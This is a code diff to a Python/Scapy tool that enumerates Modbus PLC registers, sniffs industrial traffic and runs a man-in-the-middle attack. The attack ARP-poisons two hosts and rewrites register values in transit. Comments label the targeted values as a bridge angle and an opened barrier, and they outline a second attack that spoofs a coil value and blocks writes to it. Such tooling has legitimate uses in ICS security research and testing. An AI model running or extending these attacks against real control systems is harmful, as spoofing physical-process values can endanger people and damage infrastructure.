@@ -140,13 +140,19 @@ class MBregisters():
 			if verbose:
 				print ansADU.summary()
 
+			#Valid if funcCode same between Request and Response or if exception Code != 1
 			if pkt.funcCode == ansADU.funcCode:
 				if verbose:
 					print "Code " + str(pkt.funcCode) + " defined"
 				self.setCode(ansADU.funcCode)
 			else:
-				if verbose:
-					print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
+				if pkt.funcCode == ansADU.funcCode + 0x80 and ansADU.exceptCode != 1:
+					if verbose:
+						print "Code " + str(pkt.funcCode) + " defined (but reply with error)"
+					self.setCode(ansADU.funcCode)
+				else:
+					if verbose:
+						print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
 		except:
 			if verbose:
 				print "Something bad with " + str(pkt.funcCode)
@@ -186,8 +192,6 @@ class MBregisters():
 			else:
 				if verbose:
 					print "Coil Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
-				#Does not need to go further (sequential)
-				break
 		c.close()
 
 
@@ -213,8 +217,6 @@ class MBregisters():
 			else:
 				if verbose:
 					print "Input Discrete Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
-				#Does not need to go further (sequential)
-				break
 		c.close()
 
 	def checkHoldRegDefined(self):
@@ -238,8 +240,6 @@ class MBregisters():
 			else:
 				if verbose:
 					print "Holding Register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
-				#Does not need to go further (sequential)
-				break
 		c.close()
 
 	def checkRegInDefined(self):
@@ -263,8 +263,6 @@ class MBregisters():
 			else:
 				if verbose:
 					print "Input register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
-				#Does not need to go further (sequential)
-				break
 		c.close()
 	
 	def printMe(self):
@@ -288,11 +286,12 @@ class SniffMB(threading.Thread):
 	"""
 	This class sniff traffic and initiate the reply
 	"""
-	def __init__(self, ip):
+	def __init__(self, ip, timer = 20):
 		threading.Thread.__init__(self)
 		self._stopevent = threading.Event()
 		self.querys = {}
 		self.myReg = MBregisters(ip)
+		self.timer = float(timer)
 
 	def run(self):
 		"""
@@ -303,13 +302,12 @@ class SniffMB(threading.Thread):
 		if verbose:
 			print("Sniffing...")
 #		try:
-		sniff(prn=self.__reply, filter="port " + str(modport), timeout = 20)
+		sniff(prn=self.__reply, filter="port " + str(modport), timeout = self.timer)
 #		except KeyboardInterrupt:
 #			sys.exit(0)
 #		except:
 #			print("[LISTENING] Unexpected error:"), sys.exc_info()[0]
 
-		self.myReg.printMe()
 		return
 
 	def __reply(self, pkt):
@@ -319,10 +317,11 @@ class SniffMB(threading.Thread):
 		"""	
 		
 		if ModbusADU_Request in pkt:
-			index = str(pkt[IP].src) + " >> " + str(pkt[IP].dst) + " [" + str(pkt[ModbusADU_Request].transId) + "]"
+			index = str(pkt[IP].src) + " >> " + str(pkt[IP].dst) + " [" + str(pkt[ModbusADU_Request].transId) + "]" + str(pkt.funcCode)
 			self.querys[index] = pkt
 		elif ModbusADU_Response in pkt:
-			index = str(pkt[IP].dst) + " >> " + str(pkt[IP].src) + " [" + str(pkt[ModbusADU_Response].transId) + "]"
+			index = str(pkt[IP].dst) + " >> " + str(pkt[IP].src) + " [" + str(pkt[ModbusADU_Response].transId) + "]" + str(pkt.funcCode)
+			print index
 			
 			#If we do not have the query, we reject the packet
 			if self.querys[index] is None:
@@ -458,8 +457,16 @@ class MITM:
 		self.mymac=get_if_hwaddr(iface)
 		self.querys = {}
 
-		self.val_addr = 6
+		self.val_addr = 6 # Bridge Angle
 		self.val_spoofed = None
+
+		self.val2_addr = 3 #Opened barrier
+		self.val2_desired = False
+		self.val2_spoofed = None
+
+
+
+
 		multiprocessing.Process(target=self.arp_poison).start()
 		try:
 			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
@@ -509,6 +516,15 @@ class MITM:
 				if query[ModbusPDU04_Read_Input_Registers_Request].startAddr <= self.val_addr and query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity > self.val_addr:
 					packet[ModbusPDU04_Read_Input_Registers_Response].registerVal[self.val_addr - query[ModbusPDU04_Read_Input_Registers_Request].startAddr] = self.val_spoofed
 				
+		#Attack 02 : Spoof a coil value an prevent to write the value
+			#Read value spoof
+
+			#Write value spoofed
+
+#		self.val2_addr = 3 #Opened barrier
+#		self.val2_desired = False
+#		self.val2_spoofed = None
+
 
 
 		sendp(packet, iface=iface)
@@ -679,11 +695,16 @@ def activeMonitoring(ip, timeout):
 Passive Device Monitoring
 Listen the traffic for the device values
 """
-def passiveMonitoring(ip, timeout):
-		sniffer = SniffMB(ip)
+def passiveMonitoring(ip, timer=20):
+		sniffer = SniffMB(ip, timer)
 		sniffer.start()
-		#time.sleep(10)
-		sniffer.join()
+
+		while sniffer.is_alive():
+			time.sleep(5)
+			sniffer.myReg.printMe()
+			print "---------------------------------"
+
+		sniffer.myReg.printMe()
 
 
 """
@@ -767,7 +788,7 @@ if __name__ == "__main__":
 	parser.add_argument("-t", "--target", help="IP target", default="127.0.0.1")	
 	parser.add_argument("-g", "--gateway", help="IP gateway", default="127.0.0.1")	
 	parser.add_argument("-s", "--source", help="IP source", default="127.0.0.1")	
-	parser.add_argument("-x", "--timeout", help="Timeout in ms of connection", default=100)	
+	parser.add_argument("-x", "--timeout", help="Timeout in s")	
 	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
 	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
 	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)", default="eth0")
@@ -818,7 +839,7 @@ if __name__ == "__main__":
 	elif args.mode == "activeMonitor":
 		activeMonitoring(args.target, args.timeout)	
 	elif args.mode == "passiveMonitor":
-		passiveMonitoring(args.target, args.timeout)	
+		passiveMonitoring(args.target, args.timeout)
 	elif args.mode == "fragIdentif":
 		fragIdentif(args.target)
 	else:
